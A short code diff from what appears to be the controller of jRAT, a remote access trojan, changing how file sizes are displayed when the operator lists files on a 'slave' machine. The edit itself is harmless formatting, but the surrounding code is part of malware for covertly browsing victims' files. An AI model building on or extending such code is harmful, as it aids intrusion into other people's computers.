@@ -7,6 +7,7 @@ import java.util.List;
 import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FrameRemoteFiles;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.common.utils.DataUnits;
 
 
 public class Packet19ListFiles extends AbstractIncomingPacket {
@@ -31,7 +32,7 @@ public class Packet19ListFiles extends AbstractIncomingPacket {
 				}
 			} else {
 				String date = slave.readLine();
-				String size = (dis.readLong() / 1024L) + " kB";
+				String size = DataUnits.getAsString(slave.readLong());
 				boolean hidden = dis.readBoolean();
 
 				if (line != null) {
